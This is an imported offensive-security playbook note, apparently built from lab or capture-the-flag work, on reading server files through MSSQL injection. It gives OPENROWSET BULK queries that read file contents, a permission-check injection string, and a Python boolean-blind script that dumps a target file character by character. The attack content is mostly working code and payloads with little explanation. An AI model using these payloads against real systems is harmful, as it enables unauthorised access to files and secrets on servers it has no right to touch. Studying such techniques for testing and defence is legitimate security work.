---
technique: "File Read"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/File Read.md"
source_sha256: "8811d75832d36d170ca262d46bfca3296f84564a1ca0192094020a0cbf4ea517"
curator_version: 2
review_status: imported-unreviewed
---

# File Read

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `sql: -- Get the length of a file`
- `python: SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINIST`
- `python: file_path = 'C:\\Windows\\System32\\flag.txt' # Target file`

## Playbook (operator notes)

# File Read

- If we have the correct permissions, we can `read files` via an `(MS)SQL injection`
    - https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver16
    
    
    
- `SINGLE_CLOB` means the input will be stored as a `varchar`, other options are `SINGLE_BLOB` which stores data as `varbinary`, and `SINGLE_NCLOB` which uses `nvarchar`

```sql
-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```

### **Checking Permissions**

All users can use `OPENROWSET`, but using `BULK` operations requires special privileges, specifically either `ADMINISTER BULK OPERATIONS` or `ADMINISTER DATABASE BULK OPERATIONS`

```python
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';

# Example
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS')>0;--
```

### **Reading via Boolean-based**

```python
file_path = 'C:\\Windows\\System32\\flag.txt' # Target file

# Get the length of the file contents
length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={length}"):
    length += 1
print(f"[*] File length = {length}")

# Dump the file's contents
print("[*] File = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(BulkColumn,{i},1)) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
```

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/File Read.md`
